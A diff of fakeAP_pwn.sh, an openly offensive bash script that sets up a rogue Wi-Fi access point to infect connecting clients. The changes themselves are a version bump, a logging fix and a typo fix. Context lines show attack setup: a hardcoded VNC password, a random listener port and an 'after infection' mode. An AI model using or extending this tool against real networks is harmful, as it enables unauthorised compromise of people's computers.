@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh v0.3 (Beta-#74 2010-07-30)                                                     #
+# fakeAP_pwn.sh v0.3 (Beta-#76 2010-07-30)                                                     #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -25,6 +25,7 @@
 # Beep on connected client                                                                     #
 # Check for other monitor inferfaces?                                                          #
 # Check for update at start?                                                                   #
+# $error="blah", do, save to log, cleanup                                                      #
 #---Defaults-----------------------------------------------------------------------------------#
 # The interfaces you use (Check with ifconfig!)
 interface=eth0
@@ -70,7 +71,7 @@ verbose=0
 gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
     ourIP="127.0.0.1" # 10.0.0.1?
      port=$(shuf -i 2000-65000 -n 1)
-  version="0.3 (Beta-#74)"
+  version="0.3 (Beta-#76)"
       www="${www%/}"
 trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"
 
@@ -238,7 +239,7 @@ function action() {
          echo "---------------------------------------------------------------------------------------------" >> fakeAP_pwn.log
          echo "$1~Command: $command" >> fakeAP_pwn.log
       fi
-      if [ "$5" == "true" ] ; then command="$command | tee -a fakeAP_pwn.log" ; fi
+      if [ "$4" == "true" ] && [ "$5" == "true" ] ; then command="$command | tee -a fakeAP_pwn.log" ; fi
       if [ "$7" != "" ] ; then     x=$7; fi
       if [ "$8" != "" ] ; then     y=$8; fi
       if [ "$9" != "" ] ; then lines=$9; fi
@@ -609,7 +610,7 @@ if [ "$apMode" != "non" ] ; then
       sleep 3
       command=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
       if [ -z "$command" ] ; then
-         echo -e "\e[00;31m[-]\e[00m IP Problem. Haven't got a IP address on $interface."  1>&2
+         echo -e "\e[00;31m[-]\e[00m IP Problem. Haven't got an IP address on $interface."  1>&2
          echo -e "\e[01;33m[i]\e[00m Switching apMode to: non (No Internet access after infection)"
          apMode="non"
          #command=$(ps aux | grep $interface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
